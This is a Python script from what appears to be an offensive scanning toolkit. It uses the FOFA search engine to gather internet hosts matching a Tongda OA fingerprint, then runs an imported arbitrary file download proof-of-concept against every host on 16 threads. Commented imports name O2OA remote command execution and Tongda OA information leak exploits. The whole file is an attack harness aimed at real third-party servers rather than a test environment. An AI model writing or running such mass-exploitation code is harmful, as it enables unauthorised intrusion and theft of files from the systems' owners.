from fofa import fofa
from base_poc import base_poc
import os
from Hreading import Hreading

# from POC.PeiQi文库.OA产品漏洞.O2OA.O2OA_后台远程命令执行漏洞 import poc, fofa_key
# from POC.PeiQi文库.OA产品漏洞.通达OA.通达OA_v2014_敏感信息泄漏漏洞 import POC, fofa_key, bug_name
from POC.PeiQi文库.OA产品漏洞.通达OA.通达OA_v2017_任意文件下载漏洞 import POC, fofa_key, bug_name

update_fofa_flag = False

if (
    not os.path.exists(f"./code/FOFA_URL/{bug_name}_url.txt")
    or update_fofa_flag == True
):
    fofa.select(fofa_key)
    fofa.save_file("./code/FOFA_URL/", bug_name + "_url.txt")
    fofa_url_list = [i[0] for i in fofa.get_select_data()]
else:
    with open(
        f"./code/FOFA_URL/{bug_name}_url.txt", "r", encoding="utf-8"
    ) as fofa_file:
        fofa_url_list = fofa_file.readlines()
poc_hreading = Hreading(POC)
poc_hreading.threading_start(fofa_url_list, 16)
# poc_hreading.test_start(fofa_url_list)
